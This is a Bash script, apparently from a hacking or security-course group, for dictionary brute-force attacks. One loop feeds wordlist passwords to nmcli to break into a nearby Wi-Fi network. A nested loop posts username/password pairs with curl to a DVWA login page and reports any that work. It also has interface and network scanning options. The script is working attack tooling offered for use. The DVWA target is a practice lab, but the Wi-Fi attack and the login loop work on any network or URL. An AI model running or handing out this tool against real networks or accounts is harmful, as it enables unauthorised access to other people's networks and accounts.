#!/bin/bash
# by hualkana-grupo-fsociety
# Autor: Kevin Dax Victorio Zanabria

# Regular Colors
Black='\033[0;30m'      # Black
Red='\033[0;31m'        # Red
Green='\033[0;32m'      # Green
Yellow='\033[0;33m'     # Yellow
Blue='\033[0;34m'       # Blue
Purple='\033[0;35m'     # Purple
Cyan='\033[0;36m'       # Cyan
White='\033[0;97m'      # White
Blink='\033[5m'         # Blink
Color_Off='\033[0m'     # Text Reset

# Additional colors
LGray='\033[0;90m'      # Ligth Gray
LRed='\033[0;91m'       # Ligth Red
LGreen='\033[0;92m'     # Ligth Green
LYellow='\033[0;93m'    # Ligth Yellow
LBlue='\033[0;94m'      # Ligth Blue
LPurple='\033[0;95m'    # Light Purple
LCyan='\033[0;96m'      # Ligth Cyan

# Bold
BBlack='\033[1;30m'     # Black
BGray='\033[1;37m'	# Gray
BRed='\033[1;31m'       # Red
BGreen='\033[1;32m'     # Green
BYellow='\033[1;33m'    # Yellow
BBlue='\033[1;34m'      # Blue
BPurple='\033[1;35m'    # Purple
BCyan='\033[1;36m'      # Cyan
BWhite='\033[1;37m'     # White

# Italics
IBlack='\033[3;30m'     # Black
IGray='\033[3;90m'      # Gray
IRed='\033[3;31m'       # Red
IGreen='\033[3;32m'     # Green
IYellow='\033[3;33m'    # Yellow
IBlue='\033[3;34m'      # Blue
IPurple='\033[3;35m'    # Purple
ICyan='\033[3;36m'      # Cyan
IWhite='\033[3;37m'     # White

# Underline
UBlack='\033[4;30m'     # Black
UGray='\033[4;37m'	# Gray
URed='\033[4;31m'       # Red
UGreen='\033[4;32m'     # Green
UYellow='\033[4;33m'    # Yellow
UBlue='\033[4;34m'      # Blue
UPurple='\033[4;35m'    # Purple
UCyan='\033[4;36m'      # Cyan
UWhite='\033[4;37m'     # White

# Background
On_Black='\033[40m'     # Black
On_Red='\033[41m'       # Red
On_Green='\033[42m'     # Green
On_Yellow='\033[43m'    # Yellow
On_Blue='\033[44m'      # Blue
On_Purple='\033[45m'    # Purple
On_Cyan='\033[46m'      # Cyan
On_White='\033[47m'     # White

VERSION=2.0

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n\n${Cyan}[${BYellow}!${Cyan}] ${BRed}Saliendo de la aplicación Hualkana...${Color_Off}"
    tput cnorm; exit 1
}


# Definición de la función banner
function banner() {
    LRed='\e[91m'
    LYellow='\e[93m'
    Color_Off='\e[0m'
    echo -e "${LRed}____________________________________________________________________________________"
    echo -e "__|____|______|_____|______|_______|___|___|____|________|_____|______|__|____|___|_"
    echo -e "___|____|______|_______|_____|____|___|______|____|___|_________|____|${LRed}By${LRed}_${LYellow}@Hualkana${LRed}_|"
    figlet -t "| HUALKANA-SAC |"
    echo -e "_|_____|______|_________|___|______|_______|_____|______|______|_______|______|_____${Color_Off}\n"
}

function helpPanel(){
    echo -e "version: $VERSION Beta"
    echo -e "\n${BGray}Script para realizar fuerza bruta usando un diccionario a una red inalámbrica o DVWA${Color_Off}"
    echo -e "\n${BGray}USO:${Color_Off}"
    echo -e "\t${BGray}./hualkana.sh ${BRed}[opción]${Color_Off}"
    echo -e "\n${BGray}OPCIONES:${Color_Off}"
    
    echo -e "\t${Cyan}[${BRed}-i, --INTERFACE${Cyan}] \t\t${BPurple}Muestra las interfaces de red disponibles que tiene tu maquina${Color_Off}"
    echo -e "\t${Cyan}[${BRed}-s, --SCAN${Cyan}] \t\t\t${BPurple}Escanea las redes inalámbricas disponibles${Color_Off}"
    echo -e "\t${Cyan}[${BRed}-f, --FILE <file>${Cyan}] \t\t${BPurple}Utiliza el fichero dado para realizar el ataque de fuerza bruta.${Color_Off}"
    #echo -e "\t${Cyan}[${BRed}-u, --update${Cyan}] \t\t\t${BPurple}Actualizar la herramienta a la última versión.${Color_Off}"
    echo -e "\t${Cyan}[${BRed}-in, --INFO <name-wifi>] \t${BPurple}Muestra mas informacion de la red inalámbrica indicada"
    echo -e "\t${Cyan}[${BRed}-d, --DVWA <fichero.txt>] \t${BPurple}Utiliza el fichero dado para realizar el ataque de fuerza bruta al login de DVWA"
    echo -e "\t${Cyan}[${BRed}-h, --HELP${Cyan}] \t\t\t${BPurple}Mostrar este panel de ayuda.${Color_Off}"
    
    echo -e "\n${BGray}EJEMPLOS:${Color_Off}"
    echo -e "\t${BGreen}./hualkana.sh -i ${IGray}: Mostrara todas las interfacez de red disponibles que tiene tu maquina.${Color_Off}"
    echo -e "\t${BGreen}./hualkana.sh -s ${IGray}: Escanea todas las redes WIFI que esten cerca a tu maquina.${Color_Off}"
    echo -e "\t${BGreen}./hualkana.sh -in <name_wifi> ${IGray}: Muestra informacion adicional sobre la red wifi indicada.${Color_Off}"
    echo -e "\t${BGreen}./hualkana.sh <name_wifi> -f prueba.txt <wlan0>${IGray}: Fuerza bruta a la red inalambrica <name_wifi> usando el fichero prueba.txt .${Color_Off}"
    echo -e "\t${BGreen}./hualkana.sh <url> -d prueba.txt${IGray}: Fuerza bruta al login de DVWA usando el fichero prueba.txt .${Color_Off}\n"
    
    tput cnorm; exit 0
}

function bannerF() {
cat << "INFO"
                                                          ..
                               ,,,                         MM .M
                           ,!MMMMMMM!,                     MM MM  ,.
   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
 . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
 MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
  MMM      :M  'MMMMMMMMMMM bruteDVWA MMMMMMMM'.MM  MM:M.    'MMMMM
 .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
AMMM..MMMMM:M.    :M.'MMMMMMMMMMMMMMMMMMMM'.MM'     MM''''''''''''
MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
 '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
            MMM.            'MMMM!MMMM'            .MM
             MMM.             '''   ''            .MM'
              MMM.                               MMM'
               MMMM            ,.J.JJJJ.       .MMM'
                MMMM.       'JJJJJJJ'JJJM   CMMMMM
                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
                      'MMMMMMMMM'JJJJJ JJJJJ'
                         ''MMMMMMJJJJJJJJJJ'
                                 'JJJJJJJJ'
INFO
echo -en "\n"
}




opt=$@ 					#opt es igual a todos los argumetos que vengan despues de ./hualkana --+-++654454212


#LLAMADO DEL BANNER Y LAS OPCIONES DE HUALKANA
if [ -z "$opt" ]; then
	clear
	banner
	helpPanel
fi

#LA OPCION 1 - MOSTRAR INTERFACES DE RED
if [[ $opt =~ "-i" || $opt =~ "-INTERFACE" ]]; then
	clear
	echo -e $LBlue"---Estas son las interfaces de red que esta usando tu PC---"${Color_Off}
	iwconfig
fi

#LA OPCION 2 - MOSTRAR REDES INALÁMBRICAS DISPONIBLES
if [[ $opt =~ "-s" || $opt =~ "--SCAN" ]]; then
	clear
	echo 'las siguientes redes inalambricas estan disponibles'
	iwlist wlan0 scan | awk -F: '/SSID/{print $2}'
fi

#LA OPCION 3 - REALIZAR EL ATAQUE DE FUERZA BRUTA DANDO DE ARGUMETNSO EL NOMBRE DE LA RED Y EL ARCHIVO CON LAS CONTRASEÑAS
if [[ $opt =~ "-f" || $opt =~ "--FILE" ]]; then
	#./hualkana <wifi> -f prueba.txt 
	red=$1
	archivo=$3
	interface=$4
	
	# Verificar si el archivo existe
	if [ -f "$archivo" ]; then
	  # Abrir el archivo para lectura
	  i=1
	  while IFS= read -r linea; do
	  
	    #Para encontrar la clave correcta
	    b=$(nmcli device wifi connect $red password $linea ifname $interface 2>&1)
	    if [[ $b =~ "successfully" ]]; then
	    	echo -en "\n"${LGreen}${i}.'Para Password = "'$linea'"\t\t'${Color_Off}
		echo -e ${LGreen}"<----PASSWORD CORRECTO---->"${Color_Off}
		break
	    fi
	    
	    # Procesar la línea
	    echo -en ${i}'.Para Password = "'$linea'"\t\t'
	    echo -en "INCORRECTO\n"  
	    ((i++))
	  
	  done < "$archivo"
	else
	  echo "El archivo $archivo no existe."
	fi
fi


#LA OPCION 4 - MUESTRA INFORMACION ADICIONAL DE UNA RED
if [[ $opt =~ "-in" || $opt =~ "--INFO" ]]; then
	clear
	echo "Estas son las carácteristicas para la red $2"
	#iwlist wlan0 scan | awk -v pat=$2 '/Cell/,/Unknown/ {block = block $0 ORS} /Cell/ {if (block ~ pat) print block; block = ""}'
	
	iwlist wlan0 scan | awk -v pat=$2 '/Cell/,/ESSID/{block = block $0 ORS} /ESSID/{if (block ~ pat) print block; block = ""}' | awk '/Cell/'
	iwlist wlan0 scan | awk -v pat=$2 '!/Cell/{block = block $0 ORS} /Cell/ {if (block ~ pat) print block; block = ""} '
fi

#LA OPCION 5 - LLAMA A LAS OPCION QUE TIENE EL SCRIPT HUALKANA PERO NO LIMPIA PANTALLA
if [[ "$opt" =~ "-h" || $opt =~ "--HELP" ]]; then
	banner
	helpPanel
fi


#LA OPCION 6 - REALIZAR EL ATAQUE DE FUERZA BRUTA AL LOGGIN DE DVWA
if [[ $opt =~ "-d" || $opt =~ "--DVWA" ]]; then
	#./hualkana <wifi> -f prueba.txt 
	url=$1
	archivo=$3
	# Verificar si el archivo existe
	
	if [ -f "$archivo" ]; then
	  clear
	  banner
	  bannerF
	  # Abrir el archivo para lectura
	  i=""
	  while IFS= read -r linea1; do
	  	while IFS= read -r linea2;do 
	  	
	  	    response=$(curl -v -d "username=$linea1&password=$linea2&Login=Login" $url 2>&1 | awk '/Location: / {print $3}')  
	  	    
	  	    if [[ "$response" =~ "login.php" ]]; then
			echo -en ""
			#echo -en "INCORRECTO\tPara ---> user: "${linea1}" \t---> password: "${linea2}"\n"
		    else
		    	echo -en ${LGreen}"\n==========================ENCONTRADO==========================\n"${Color_Off}
		    	echo -en ${LGreen}"||"${Color_Off}"\tPara ---> user: "${Green}${linea1}${Color_Off}" \t---> password: "${Green}${linea2}${Color_Off}"\t    "${LGreen}"||\n"${Color_Off}
		    	echo -en ${LGreen}"==========================ENCONTRADO==========================\n\n"${Color_Off}
		    fi
	  	    #((i++))		    
		done < "$archivo"
	  done < "$archivo"
	else
	  echo "El archivo $archivo no existe."
	fi
fi


